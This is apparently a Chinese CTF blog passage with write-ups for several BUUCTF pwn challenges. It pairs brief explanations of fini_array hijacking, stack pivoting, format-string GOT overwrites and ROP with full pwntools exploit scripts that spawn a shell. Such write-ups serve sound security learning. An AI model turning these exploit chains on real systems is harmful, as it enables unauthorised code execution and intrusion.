<h2 id="fini-array"><a href="#fini-array" class="headerlink" title="fini_array"></a>fini_array</h2><h3 id="pwnable-317"><a href="#pwnable-317" class="headerlink" title="pwnable_317"></a>pwnable_317</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#pwnable_317">BUUCTF在线评测 (buuoj.cn)</a></p>
<p>这个题目很不错，学到了很多</p>
<p>漏洞点很明显，任意地址写，不过这里反汇编有点问题，再写过一次后就会被修改，然后就不可以写了，所以我们的目的就是想多次写</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656842905839-c21f5445-ebe3-4135-a345-22952a38c410.png#averageHue=%23fefefa&clientId=u9d5fd636-f51f-4&from=paste&height=499&id=ubcc91e93&originHeight=624&originWidth=772&originalType=binary&ratio=1&rotation=0&showTitle=false&size=106244&status=done&style=none&taskId=u79d8c9dd-b021-4f73-8d2f-473aad5626e&title=&width=617.6" alt="image.png"></p>
<p>函数执行退出后会去libc_csu_finia</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656842915707-e8910d83-23f5-4977-8413-3551fa5e559e.png#averageHue=%23fdfcfc&clientId=u9d5fd636-f51f-4&from=paste&height=263&id=u8e19ef43&originHeight=329&originWidth=910&originalType=binary&ratio=1&rotation=0&showTitle=false&size=54255&status=done&style=none&taskId=uc373dcb6-8d67-47f8-8d7f-527f1426959&title=&width=728" alt="image.png"></p>
<p>他会调用fini_array[1],fini_array[0]</p>
<p>那么我们如果把fini_array[1]改成main,fini_array[0]改成libc_csu_finial就可以无限执行main里面地址写</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">fini_arr=<span class="number">0x4B40F0</span></span><br><span class="line">libc_csu_finial=<span class="number">0x402960</span></span><br><span class="line">main_addr=<span class="number">0X401B6D</span></span><br><span class="line">sla(b<span class="string">&quot;addr:&quot;</span>,str(fini_arr))</span><br><span class="line">sla(b<span class="string">&quot;data:&quot;</span>,p64(libc_csu_finial)+p64(main_addr))</span><br><span class="line"></span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000401696</span></span><br><span class="line">sla(b<span class="string">&quot;addr:&quot;</span>,str(fini_arr+<span class="number">0x10</span>))</span><br><span class="line">sa(b<span class="string">&quot;data:&quot;</span>,p64(pop_rdi_ret)+p64(fini_arr+<span class="number">0x58</span>))#这里我们写入bin/sh</span><br><span class="line"></span><br><span class="line">pop_rsi_ret=<span class="number">0x0000000000406c30</span></span><br><span class="line">sla(b<span class="string">&quot;addr:&quot;</span>,str(fini_arr+<span class="number">0x20</span>))</span><br><span class="line">sa(b<span class="string">&quot;data:&quot;</span>,p64(pop_rsi_ret)+p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">pop_rdx_ret=<span class="number">0x0000000000446e35</span></span><br><span class="line">sla(b<span class="string">&quot;addr:&quot;</span>,str(fini_arr+<span class="number">0x30</span>))</span><br><span class="line">sa(b<span class="string">&quot;data:&quot;</span>,p64(pop_rdx_ret)+p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">pop_rax_ret=<span class="number">0x000000000041e4af</span></span><br><span class="line">sla(b<span class="string">&quot;addr:&quot;</span>,str(fini_arr+<span class="number">0x40</span>))</span><br><span class="line">sa(b<span class="string">&quot;data:&quot;</span>,p64(pop_rax_ret)+p64(<span class="number">59</span>))</span><br><span class="line"></span><br><span class="line">syscall=<span class="number">0x00000000004022b4</span></span><br><span class="line">sla(b<span class="string">&quot;addr:&quot;</span>,str(fini_arr+<span class="number">0x50</span>))</span><br><span class="line">sa(b<span class="string">&quot;data:&quot;</span>,p64(syscall)+b<span class="string">&quot;/bin/sh\0&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>可以看到我们想把栈迁移到fini_array,但为什么能迁移呢</p>
<p>rbp就是我们fini_array的地址，如果我们再fini_array里面执行leave,就可以完成栈迁移了</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656842929089-3eb52f55-77e0-4d96-ae05-354dcd6e8cc7.png#averageHue=%23fbfaf9&clientId=u9d5fd636-f51f-4&from=paste&height=348&id=u1f200e16&originHeight=435&originWidth=935&originalType=binary&ratio=1&rotation=0&showTitle=false&size=182644&status=done&style=none&taskId=u6dab4bd9-847e-478a-bf11-80f61119096&title=&width=748" alt="image.png"></p>
<p>这里由于我们是循环执行main,所以当我们修改完fini_arrya的时候这里执行的是fini_array[0],所以我们把fini_array[0]变成leave_ret,然后栈迁移，这个时候rsp就是fini_array+8,这个时候把finiarray[1]改成ret,然后就可以进入到后面的pop_ret,fini_array[0]和finiarryay[1]再前面布置的过程中不可以修改</p>
<p>allpayloads</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">fini_arr=<span class="number">0x4B40F0</span></span><br><span class="line">libc_csu_finial=<span class="number">0x402960</span></span><br><span class="line">main_addr=<span class="number">0X401B6D</span></span><br><span class="line">sla(b<span class="string">&quot;addr:&quot;</span>,str(fini_arr))</span><br><span class="line">sla(b<span class="string">&quot;data:&quot;</span>,p64(libc_csu_finial)+p64(main_addr))</span><br><span class="line"></span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000401696</span></span><br><span class="line">sla(b<span class="string">&quot;addr:&quot;</span>,str(fini_arr+<span class="number">0x10</span>))</span><br><span class="line">sa(b<span class="string">&quot;data:&quot;</span>,p64(pop_rdi_ret)+p64(fini_arr+<span class="number">0x58</span>))#这里我们写入bin/sh</span><br><span class="line"></span><br><span class="line">pop_rsi_ret=<span class="number">0x0000000000406c30</span></span><br><span class="line">sla(b<span class="string">&quot;addr:&quot;</span>,str(fini_arr+<span class="number">0x20</span>))</span><br><span class="line">sa(b<span class="string">&quot;data:&quot;</span>,p64(pop_rsi_ret)+p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">pop_rdx_ret=<span class="number">0x0000000000446e35</span></span><br><span class="line">sla(b<span class="string">&quot;addr:&quot;</span>,str(fini_arr+<span class="number">0x30</span>))</span><br><span class="line">sa(b<span class="string">&quot;data:&quot;</span>,p64(pop_rdx_ret)+p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">pop_rax_ret=<span class="number">0x000000000041e4af</span></span><br><span class="line">sla(b<span class="string">&quot;addr:&quot;</span>,str(fini_arr+<span class="number">0x40</span>))</span><br><span class="line">sa(b<span class="string">&quot;data:&quot;</span>,p64(pop_rax_ret)+p64(<span class="number">59</span>))</span><br><span class="line"></span><br><span class="line">syscall=<span class="number">0x00000000004022b4</span></span><br><span class="line">sla(b<span class="string">&quot;addr:&quot;</span>,str(fini_arr+<span class="number">0x50</span>))</span><br><span class="line">sa(b<span class="string">&quot;data:&quot;</span>,p64(syscall)+b<span class="string">&quot;/bin/sh\0&quot;</span>)</span><br><span class="line"></span><br><span class="line">leave_ret=<span class="number">0x0000000000401c4b</span></span><br><span class="line">ret=<span class="number">0x0000000000401016</span></span><br><span class="line">sla(b<span class="string">&quot;addr:&quot;</span>,str(fini_arr))</span><br><span class="line">sa(b<span class="string">&quot;data:&quot;</span>,p64(leave_ret)+p64(ret))</span><br><span class="line"></span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<p>另一种exp</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">fini_arr=<span class="number">0x4B40F0</span></span><br><span class="line">libc_csu_finial=<span class="number">0x402960</span></span><br><span class="line">main_addr=<span class="number">0X401B6D</span></span><br><span class="line">sla(b<span class="string">&quot;addr:&quot;</span>,str(fini_arr))</span><br><span class="line">sla(b<span class="string">&quot;data:&quot;</span>,p64(libc_csu_finial)+p64(main_addr))</span><br><span class="line"></span><br><span class="line">pop_rsi_ret=<span class="number">0x0000000000406c30</span></span><br><span class="line">sla(b<span class="string">&quot;addr:&quot;</span>,str(fini_arr+<span class="number">0x18</span>))</span><br><span class="line">sa(b<span class="string">&quot;data:&quot;</span>,p64(pop_rsi_ret)+p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">pop_rdx_ret=<span class="number">0x0000000000446e35</span></span><br><span class="line">sla(b<span class="string">&quot;addr:&quot;</span>,str(fini_arr+<span class="number">0x28</span>))</span><br><span class="line">sa(b<span class="string">&quot;data:&quot;</span>,p64(pop_rdx_ret)+p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">pop_rax_ret=<span class="number">0x000000000041e4af</span></span><br><span class="line">sla(b<span class="string">&quot;addr:&quot;</span>,str(fini_arr+<span class="number">0x38</span>))</span><br><span class="line">sa(b<span class="string">&quot;data:&quot;</span>,p64(pop_rax_ret)+p64(<span class="number">59</span>))</span><br><span class="line"></span><br><span class="line">syscall=<span class="number">0x00000000004022b4</span></span><br><span class="line">sla(b<span class="string">&quot;addr:&quot;</span>,str(fini_arr+<span class="number">0x48</span>))</span><br><span class="line">sa(b<span class="string">&quot;data:&quot;</span>,p64(syscall)+b<span class="string">&quot;/bin/sh\0&quot;</span>)</span><br><span class="line"></span><br><span class="line">leave_ret=<span class="number">0x0000000000401c4b</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000401696</span></span><br><span class="line">sla(b<span class="string">&quot;addr:&quot;</span>,str(fini_arr))</span><br><span class="line">sa(b<span class="string">&quot;data:&quot;</span>,p64(leave_ret)+p64(pop_rdi_ret)+p64(fini_arr+<span class="number">0x50</span>))</span><br><span class="line"></span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h3 id="ciscn-2019-sw-1"><a href="#ciscn-2019-sw-1" class="headerlink" title="ciscn_2019_sw_1"></a>ciscn_2019_sw_1</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#ciscn_2019_sw_1">BUUCTF在线评测</a></p>
<p>利用格式化字符串修改fini_array为main地址从而劫持控制流,同时修改got表，然后第二次直接输入&#x2F;bin&#x2F;sh就可以</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line"># -*- coding: utf<span class="number">-8</span> -*-</span><br><span class="line"><span class="meta"># from LibcSearcher import LibcSearcheronline</span></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">it = lambda: io.interactive()</span><br><span class="line">ru = lambda x: io.recvuntil(x)</span><br><span class="line">rud = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">rl = lambda: io.recvline()</span><br><span class="line">rld = lambda: io.recvline(keepends=False)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line">elf_path = <span class="string">&quot;./ciscn_2019_sw_1&quot;</span></span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;2.23&quot;</span> in libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x3A80C</span>, <span class="number">0x3A80E</span>, <span class="number">0x3A812</span>, <span class="number">0x3A819</span>, <span class="number">0x5F065</span>, <span class="number">0x5F066</span>]</span><br><span class="line">elif <span class="string">&quot;2.27&quot;</span> in libc.path:</span><br><span class="line">    one_gadget = [</span><br><span class="line">        <span class="number">0x3CBEA</span>,</span><br><span class="line">        <span class="number">0x3CBEC</span>,</span><br><span class="line">        <span class="number">0x3CBF0</span>,</span><br><span class="line">        <span class="number">0x3CBF7</span>,</span><br><span class="line">        <span class="number">0x6729F</span>,</span><br><span class="line">        <span class="number">0x672A0</span>,</span><br><span class="line">        <span class="number">0x13573E</span>,</span><br><span class="line">        <span class="number">0x13573F</span>,</span><br><span class="line">    ]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    one_gadget = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    remote_ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">    remote_port = <span class="number">26660</span></span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(elf_path)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdbscript = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    b *0x80485A8</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line"></span><br><span class="line">fini_arr = <span class="number">0x804979C</span></span><br><span class="line">printf_got = elf.got[<span class="string">&quot;printf&quot;</span>]</span><br><span class="line"></span><br><span class="line"># main_addr=<span class="number">0x804</span>=&gt;<span class="number">2052</span>      <span class="number">8534</span></span><br><span class="line"># system_addr=<span class="number">0x804</span>=&gt;<span class="number">2052</span>   <span class="number">83</span>d0=&gt;<span class="number">33744</span></span><br><span class="line">payload = f<span class="string">&quot;%2052c%17$hn%19$hn%&#123;33744-2052&#125;c%16$hn%&#123;0x8534-0x83d0&#125;c%18$hn&quot;</span>.encode()</span><br><span class="line">payload = payload.ljust(<span class="number">0x30</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">payload += p32(printf_got) + p32(printf_got + <span class="number">2</span>) + p32(fini_arr) + p32(fini_arr + <span class="number">2</span>)</span><br><span class="line">sla(b<span class="string">&quot;your name?\n&quot;</span>, payload)</span><br><span class="line">sla(b<span class="string">&quot;your name?\n&quot;</span>, <span class="string">&quot;/bin/sh\0&quot;</span>)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><h3 id="asis-finals-2019-rop13"><a href="#asis-finals-2019-rop13" class="headerlink" title="asis_finals_2019_rop13"></a>asis_finals_2019_rop13</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mov_rsi_rsp=0x000000000040042a# mov rsi, qword ptr [rsp + 0x10] ; ret</span><br><span class="line">pop_rdx_rbp_ret=0x000000000040047e</span><br><span class="line">mov_edi_rsi_ret=0x0000000000400426#mov edi, dword ptr [rsp + 8] ; mov rsi, qword ptr [rsp + 0x10] ; ret</span><br><span class="line">leave_ret=0x4004B6</span><br><span class="line">bss=0x601300</span><br><span class="line">s(b&quot;\x00&quot;*0x48+p64(mov_rsi_rsp)+p64(pop_rdx_rbp_ret)+p64(0x8)+p64(elf.got[&quot;write&quot;])+p64(elf.plt[&quot;write&quot;])+p64(mov_edi_rsi_ret)+p64(pop_rdx_rbp_ret)+p64(0x0)+p64(bss)+p64(pop_rdx_rbp_ret)+p64(0x60)+p64(bss-8)+p64(elf.plt[&quot;read&quot;])+p64(leave_ret))</span><br><span class="line">libc_base=u64(ru(b&quot;\x7f&quot;)[-6:].ljust(8,b&quot;\0&quot;))-libc.sym[&quot;write&quot;]</span><br><span class="line">pop_rdi_ret=0x000000000002155f+libc_base</span><br><span class="line">system_addr=libc_base+libc.sym[&quot;system&quot;]</span><br><span class="line">bin_sh=libc_base+next(libc.search(b&quot;/bin/sh\0&quot;))</span><br><span class="line">s(p64(pop_rdi_ret)+p64(bin_sh)+p64(system_addr))</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>
<h3 id="microwave-ins-2016"><a href="#microwave-ins-2016" class="headerlink" title="microwave_ins_2016"></a>microwave_ins_2016</h3><p>还可以题目<br>利用print_chk泄露libc和canary</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">def login(username,password):</span><br><span class="line">    sla(b&quot;MicroWave]: &quot;,b&quot;1&quot;)</span><br><span class="line">    sla(b&quot;username: &quot;,username)</span><br><span class="line">    sla(b&quot;password: &quot;,password)</span><br><span class="line"></span><br><span class="line">def shuru(content):</span><br><span class="line">    sla(b&quot;MicroWave]: &quot;,b&quot;2&quot;)</span><br><span class="line">    sa(b&quot;#&gt; &quot;,content)</span><br><span class="line">    </span><br><span class="line">login(b&quot;%p&quot;*(6),b&quot;n07_7h3_fl46&quot;)</span><br><span class="line">ru(b&quot;Checking &quot;)</span><br><span class="line">content=rld().split(b&quot;0x&quot;)</span><br><span class="line">libc_base=int(b&quot;0x&quot;+content[2],16)-0xf72c0</span><br><span class="line">canary=int(b&quot;0x&quot;+content[-1],16)</span><br><span class="line">pop_rdi_ret=libc_base+0x0000000000021102</span><br><span class="line">bin_sh_addr=libc_base+next(libc.search(b&quot;/bin/sh\0&quot;))</span><br><span class="line">system_addr=libc_base+libc.sym[&quot;system&quot;]</span><br><span class="line">shuru(b&quot;a&quot;*0x408+p64(canary)+b&quot;a&quot;*0x8+p64(pop_rdi_ret)+p64(bin_sh_addr)+p64(system_addr))</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>
<h3 id="seccon2022-koncha"><a href="#seccon2022-koncha" class="headerlink" title="seccon2022-koncha"></a>seccon2022-<strong>koncha</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sla(b&quot;Hello! What is your name?\n&quot;,b&quot;&quot;)</span><br><span class="line">ru(b&quot;Nice to meet you, &quot;)</span><br><span class="line">libc_base=u64(ru(b&quot;\x7f&quot;).ljust(8,b&quot;\0&quot;))+0x7f43ea148000-0x7f43ea3392e8</span><br><span class="line"></span><br><span class="line">pop_rdi_ret=libc_base+0x0000000000023b6a</span><br><span class="line">bin_sh=libc_base+next(libc.search(b&quot;/bin/sh\0&quot;))</span><br><span class="line">system=libc_base+libc.sym[&quot;system&quot;]</span><br><span class="line">one_gadget=libc_base+0xe3b01</span><br><span class="line">ret=libc_base+0x0000000000022679</span><br><span class="line">#sla(b&quot;Which country do you live in?\n&quot;,b&quot;a&quot;*0x58+p64(one_gadget))</span><br><span class="line">sla(b&quot;Which country do you live in?\n&quot;,b&quot;a&quot;*0x58+p64(ret)+p64(pop_rdi_ret)+p64(bin_sh)+p64(system))</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>
<h3 id="wdb-2018-final-pwn3"><a href="#wdb-2018-final-pwn3" class="headerlink" title="wdb_2018_final_pwn3"></a>wdb_2018_final_pwn3</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#wdb_2018_final_pwn3">https://buuoj.cn/challenges#wdb_2018_final_pwn3</a><br>栈溢出，修改fd，然后控制target</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment">#  -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">it = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x)</span><br><span class="line">rud = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline()</span><br><span class="line">rld = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">False</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf_path = <span class="string">&quot;./pwn3&quot;</span></span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;2.23&quot;</span> <span class="keyword">in</span> libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x4526A</span>, <span class="number">0x45216</span>, <span class="number">0xF02A4</span>, <span class="number">0xF1147</span>]</span><br><span class="line"><span class="keyword">elif</span> <span class="string">&quot;2.27&quot;</span> <span class="keyword">in</span> libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x4F2C5</span>, <span class="number">0x4F322</span>, <span class="number">0x10A38C</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    one_gadget = []</span><br><span class="line"></span><br><span class="line"><span class="comment">#b *$rebase(0xF56) malloc调试</span></span><br><span class="line"><span class="comment"># b *$rebase(0x1205) flag测试</span></span><br><span class="line"><span class="comment"># b *$rebase(0x148B) free</span></span><br><span class="line"><span class="comment"># gdbscript = &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#     b *$rebase(0x1199)</span></span><br><span class="line"><span class="comment">#     c</span></span><br><span class="line"><span class="comment">#     &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># db=gdb.debug(&quot;./server&quot;,gdbscript=gdbscript)</span></span><br><span class="line"><span class="comment"># sleep(1)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    remote_ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">    remote_port =<span class="number">27557</span></span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(elf_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    <span class="keyword">global</span> io</span><br><span class="line">    gdbscript = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    b  *0x400E9F</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"><span class="comment"># def debug_force():</span></span><br><span class="line"><span class="comment">#     global io</span></span><br><span class="line"><span class="comment">#     io.close()</span></span><br><span class="line"><span class="comment">#     gdbscript = &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#     b *$rebase(0x145F)</span></span><br><span class="line"><span class="comment">#     c</span></span><br><span class="line"><span class="comment">#     &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#     io=gdb.debug(elf_path,gdbscript=gdbscript)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#1 0x10</span></span><br><span class="line"><span 